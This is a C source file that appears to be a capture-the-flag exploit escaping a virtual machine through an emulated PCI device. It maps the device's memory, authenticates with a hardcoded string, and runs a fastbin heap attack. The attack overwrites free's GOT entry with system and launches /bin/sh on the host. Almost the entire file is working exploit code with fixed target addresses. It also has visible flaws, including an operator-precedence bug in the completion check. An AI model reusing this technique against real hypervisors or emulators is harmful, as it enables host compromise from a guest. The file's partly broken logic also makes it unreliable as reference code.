#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>

const size_t free_got = 0x11B92C8;
const size_t fastbin_chunk = 0x11b92b2;
const size_t system_plt = 0x411420;

unsigned char* iomem;

void die(const char* msg)
{
	perror(msg);
	exit(-1);
}

void iowrite(uint64_t addr, uint64_t value)
{
	*((uint64_t*)(iomem + addr)) = value;
}

uint64_t ioread(uint64_t addr)
{
	return *((uint64_t*)(iomem + addr));
}

void iowrite32(uint64_t addr, uint32_t value)
{
	*((uint32_t*)(iomem + addr)) = value;
}

uint32_t ioread32(uint64_t addr)
{
	return *((uint32_t*)(iomem + addr));
}

void do_malloc(int idx, int sz) {
	send_request(idx, 1, sz, 0);
	while (check_request_done()) {usleep(100);}
}

void do_free(int idx) {
	send_request(idx, 3, 0, 0);
	while (check_request_done()) {usleep(100);}
}

void do_edit(int idx, int offset, unsigned int data) {
	send_request(idx, 2, offset, data);
	while (check_request_done()) {usleep(100);}
}

void send_request(int idx, int op, int offset, unsigned int data) {
	if (idx >= 0 && idx < 0x10 && op >= 0 && op < 0x10 && offset >= 0 && offset < 0x100) {
		unsigned int addr = 0;
		addr |= 0x30;
		addr |= idx << 8;
		addr |= op << 12;
		addr |= offset << 16;
		iowrite32(addr, data);
	} else {
		fprintf(stderr, "Invalid request!\n");
	}
}

int check_request_done() {
	uint32_t flags = ioread32(0x20);
	if (flags & 4 == 0) {
		return 1;
	} else {
		return 0;
	}
}

int main(int argc, char *argv[])
{
	// Open and map I/O memory
	int fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
	if (fd == -1)
		die("open");

	iomem = mmap(0, 0x1000000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	if (iomem == MAP_FAILED)
		die("mmap");

	printf("iomem @ %p\n", iomem);

	char auth_str[] = "Xnuca";
	char cmd[64] = "/bin/sh\0\0\0\0\0\0";
	unsigned int *cmd_ptr = cmd;

	// Auth first
	iowrite32(0x10, auth_str[0]);
	iowrite32(0x10, auth_str[1]);
	iowrite32(0x10, auth_str[2]);
	iowrite32(0x10, auth_str[3]);
	iowrite32(0x10, auth_str[4]);

	// Set timer
	iowrite32(0x20, 0);

	do_malloc(0, 0x38);

	// Fastbin
	do_free(0);
	do_edit(0, 0, fastbin_chunk);
	do_malloc(1, 0x38);
	do_malloc(2, 0x38);

	// Modify free_got
	do_edit(2, 6, system_plt);
	do_edit(2, 10, 0);

	// Put cmd payload
	for (int i = 0; cmd_ptr[i] != 0; i++) {
		do_edit(0, i*4, cmd_ptr[i]);
	}

	// Triggle system(cmd)
	do_free(0);
	send_request(0, 0xF, 0, 0);
	printf("Done\n");
	getchar();

	return 0;
}
